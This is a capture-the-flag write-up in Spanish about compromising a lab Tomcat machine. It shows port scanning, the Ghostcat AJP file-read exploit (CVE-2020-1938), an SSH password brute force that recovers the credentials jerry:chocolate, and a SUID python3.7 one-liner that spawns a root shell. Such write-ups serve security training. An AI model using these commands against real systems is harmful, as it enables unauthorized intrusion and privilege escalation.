### Reconocimiento
Realizo un escaneo en busqueda de puertos abiertos.
```
nmap -p- --open --min-rate 4000 -sS -Pn -n 172.17.0.2 -oG puertos
```

Se encuentran los puertos **22, 8009 y 8080**, realizo en escaneo mas exahustivo en busqueda de servicios y versiones.

```
nmap -p22,8009,8080 -sCV 172.17.0.2 -oN escaneo

 5   │ PORT     STATE SERVICE VERSION
   6   │ 22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   2048 4d:8d:56:7f:47:95:da:d9:a4:bb:bc:3e:f1:56:93:d5 (RSA)
   9   │ |   256 8d:82:e6:7d:fb:1c:08:89:06:11:5b:fd:a8:08:1e:72 (ECDSA)
  10   │ |_  256 1e:eb:63:bd:b9:87:72:43:49:6c:76:e1:45:69:ca:75 (ED25519)
  11   │ 8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
  12   │ | ajp-methods: 
  13   │ |_  Supported methods: GET HEAD POST OPTIONS
  14   │ 8080/tcp open  http    Apache Tomcat 9.0.30
  15   │ |_http-open-proxy: Proxy might be redirecting requests
  16   │ |_http-favicon: Apache Tomcat
  17   │ |_http-title: Apache Tomcat/9.0.30
  18   │ MAC Address: 12:22:3A:77:4B:E3 (Unknown)
  19   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeracion web
Accedo a la pagina web:
```
http://172.17.0.2:8080
```
Se identifica un servidor **Apache Tomcat**

#### Fuzzing de directorios
Realizo fuzzing en busqueda de directorios
```
gobuster dir -u http://172.17.0.2:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Los directorios encontrados:
- /docs
- /examples
- /manager

Intento ingresar a tomcat manager para ver su contenido
```
http://172.17.0.2/manager
```

No se encuentra nada ya que tiene el acceso restringido.

### Explotacion Ghostcat
En el puerto 8009 (AJP), se encuentra que es vulnerable a Ghoscat(CVE-2020-1938)

Descargo del exploit:
```
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git
cd CNVD-2020-10487-Tomcat-Ajp-lfi
```

Ejecuto el exploit para poder leer archivos internos
```
python3 ajpShooter.py http://172.17.0.2 8009 /WEB-INF/web.xml read
```

El output relevante que encuentro:
```
Welcome to Tomcat, Jerry ;)
```
Lo que me dice que hay un posible usuario jerry 

Realizo fuerza bruta con hydra buscando posibles contraseñas
```
hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4

jerry : chocolate
```

Ya con el usuario y la contraseña ingreso a travez de *ssh* 

```
ssh jerry@172.17.0.2
```

### Escalada de privilegios
 Realizo una busqueda de privilegios SUDO pero no tengo ninguno, al no encontrar realizo busqueda de permisos SUID
 ```
 find / -perm -4000 2>/dev/null
 ```

Encuentro que */usr/bin/python3.7* es explotable

```
/usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Al ejecutar el comando me deja ingresar como *root*
